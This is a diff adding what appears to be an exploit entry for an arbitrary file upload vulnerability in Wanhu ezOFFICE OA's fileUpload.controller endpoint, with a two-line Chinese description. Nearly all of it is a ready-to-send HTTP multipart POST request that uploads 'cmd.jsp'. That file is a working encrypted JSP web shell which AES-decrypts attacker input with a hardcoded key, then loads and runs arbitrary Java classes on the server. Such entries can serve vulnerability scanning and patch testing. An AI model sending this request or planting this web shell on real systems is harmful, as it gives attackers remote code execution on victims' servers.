@@ -1,0 +1,17 @@
+# 万户OA fileUpload.controller 任意文件上传漏洞
+# 万户ezOFFICE协同管理平台是一个综合信息基础应用平台。万户OA fileUpload.controller 存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件。
+POST /defaultroot/upload/fileUpload.controller?acid=80051426&bid=hd_tag_m8mv23r5 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23r5
+RM-PRO-Token: 343141107dcb8df64899d1cb4db40136
+RM-PRO-Time: 1742808338835
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0
+
+--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0
+Content-Disposition: form-data; name="file"; filename="cmd.jsp"
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: binary
+
+<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*......tas9er*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
+--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--
